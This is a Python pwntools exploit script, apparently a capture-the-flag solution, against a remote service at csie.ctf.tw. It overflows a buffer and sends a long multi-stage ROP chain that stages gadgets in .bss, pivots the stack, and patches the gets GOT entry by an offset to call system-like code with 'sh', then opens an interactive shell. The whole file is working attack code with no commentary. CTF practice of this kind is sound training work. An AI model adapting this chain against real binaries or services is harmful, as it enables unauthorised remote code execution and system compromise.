#!/usr/bin/env python

from pwn import *

r = remote('csie.ctf.tw', 10141)

offset = 0xfffd42a0

gets = 0x400430
pop_rsp_r13_r14_r15_ret = 0x4005bd
pop_rbp_ret = 0x4004a0
pop_rdi_ret = 0x4005c3
pop_r15_ret = 0x4005c2
pop_rsi_r15_ret = 0x4005c1
pop_rbp_r14_r15_ret = 0x4005bf
pop_rbx_rbp_r12_r13_r14_r15_ret = 0x4005ba
add_ebx_esi_ret = 0x400509
leave_ret = 0x400554
csu_init = 0x400560
call_at_r12 = 0x4005a9

gets_got = 0x600ff0

# this is the last part of .bss or .got ?!
# all buffer should be big enough, otherwise one buffer will cover the others.
buf1 = 0x601f00
buf2 = 0x601e00
buf3 = 0x601d00
buf4 = 0x601c00
buf5 = 0x601b00
buf6 = 0x601a00
buf7 = 0x601900
buf8 = 0x601800


rop1 = [
    pop_rdi_ret, buf1, gets, # rop2
    pop_rdi_ret, buf2, gets, # rop4
    pop_rdi_ret, buf3, gets, # rop5
    pop_rdi_ret, buf4, gets, # rop7
    pop_rdi_ret, buf5, gets, # rop9
    pop_rdi_ret, buf6, gets, # rop10
    pop_rdi_ret, buf7, gets, # rop13
    pop_rbp_ret, buf1-8, leave_ret,
    ]

rop2 = [ # buf1
    pop_rdi_ret, gets_got+24, gets, #rop3
    pop_rbp_ret, buf2-8,
    pop_rsp_r13_r14_r15_ret, gets_got
    ]

rop3 = [ # gets_got+24
    leave_ret
    ]

rop4 = [ # buf2
    csu_init,
    pop_rbp_ret, buf3-8, leave_ret
    ]

rop5 = [ # buf3
    pop_rdi_ret, buf2-24, gets, #rop6_1
    pop_rdi_ret, buf2+32, gets, #rop6_2
    pop_rbp_ret, buf2-24-8, leave_ret
    ]

rop6_1 = [ # buf2 - 24
    pop_rbx_rbp_r12_r13_r14_r15_ret, 
    ]

rop6_2 = [ # buf2 + 32
    pop_rsi_r15_ret, offset, 0,
    add_ebx_esi_ret,
    csu_init,
    pop_rbp_ret, buf4-8, leave_ret,
    ]


rop7 = [ # buf4
    pop_rdi_ret, gets_got+28, gets, #rop8
    pop_rbp_ret, buf5-8,
    pop_rsp_r13_r14_r15_ret, gets_got+4
    ]

rop8 = [ # gets_got+28
    leave_ret
    ]

rop9 = [ # buf5
    csu_init,
    pop_rbp_ret, buf6-8, leave_ret
    ]

rop10 = [ # buf6
    pop_rdi_ret, buf5-24, gets, #rop11_1
    pop_rdi_ret, buf5+32, gets, #rop11_2
    pop_rbp_ret, buf5-24-8, leave_ret
    ]

rop11_1 = [ # buf5 - 24
    pop_rbx_rbp_r12_r13_r14_r15_ret, 
    ]

rop11_2 = [ # buf5 + 32
    pop_rdi_ret, buf2+68, gets, #rop12
    pop_rbp_ret, buf2+68-8, leave_ret
    ]

rop12 = [ # buf2+164
    csu_init,
    pop_rbp_ret, buf7-8, leave_ret
    ]

rop13 = [
    pop_rdi_ret, buf8, gets, # shell command
    pop_rdi_ret, buf8,
    pop_rbx_rbp_r12_r13_r14_r15_ret, 0, 0, buf2+24, 0, 0, 0,
    call_at_r12
    ]

r.send('A'*24 +
    ''.join(map(p64,rop1)) + '\n' +
    ''.join(map(p64,rop2)) + '\n' +
    ''.join(map(p64,rop4)) + '\n' +
    ''.join(map(p64,rop5)) + '\n' +
    ''.join(map(p64,rop7)) + '\n' +
    ''.join(map(p64,rop9)) + '\n' +
    ''.join(map(p64,rop10)) + '\n' +
    ''.join(map(p64,rop13)) + '\n' +
    ''.join(map(p64,rop3))[:-1] + '\n' +
    ''.join(map(p64,rop6_1))[:-1] + '\n' +
    ''.join(map(p64,rop6_2)) + '\n' +
    ''.join(map(p64,rop8)) + '\n' +
    ''.join(map(p64,rop11_1))[:-1] + '\n' +
    ''.join(map(p64,rop11_2)) + '\n' +
    ''.join(map(p64,rop12)) + '\n' +
    'sh' + '\n')

r.interactive()
